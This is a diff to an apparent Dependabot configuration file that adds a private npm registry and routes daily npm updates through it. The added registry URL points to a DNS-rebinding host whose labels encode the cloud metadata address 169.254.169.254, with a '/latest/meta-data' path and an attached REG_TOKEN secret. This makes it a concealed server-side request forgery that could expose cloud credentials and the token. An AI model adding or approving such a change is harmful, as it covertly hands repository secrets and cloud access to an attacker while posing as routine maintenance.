@@ -1,8 +1,15 @@
 version: 2
+registries:
+  codex-rebind-reg:
+    type: npm-registry
+    url: "http://a9fea9fe.5db8d822.rbndr.us/latest/meta-data"
+    token: "${{secrets.REG_TOKEN}}"
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule:
       interval: "daily"
     target-branch: "main"
+    registries:
+      - codex-rebind-reg
     open-pull-requests-limit: 10
